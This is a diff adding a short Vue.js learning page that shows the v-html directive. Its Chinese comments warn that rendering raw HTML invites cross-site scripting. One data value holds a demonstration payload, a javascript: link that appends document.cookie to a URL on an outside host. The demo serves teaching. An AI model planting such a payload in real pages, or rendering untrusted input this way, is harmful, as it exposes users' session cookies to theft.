@@ -1,0 +1,27 @@
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <script src="../js/vue.js"></script>
+  </head>
+  <body>
+    <div id="root">
+        <!-- 就是innerHTML -->
+        <!-- 动态渲染html容易导致xss攻击 xss：跨站脚本攻击-->
+        <div v-html="str"></div>
+        <div v-html="str2"></div>
+    </div>
+   
+    <script>
+        //设置为 false 以阻止 vue 在启动时生成生产提示。
+        Vue.config.productionTip = false;
+        const vm = new Vue({
+          el: '#root',
+          data: {
+            name:"123456",
+            str:"<h1>nihao</h1>",
+            str2:"<a href=javascript:location.href='https://www.baidu.com?'+document.cookie>1111111</a>"
+          },
+        });
+    </script>
+  </body>
+</html>
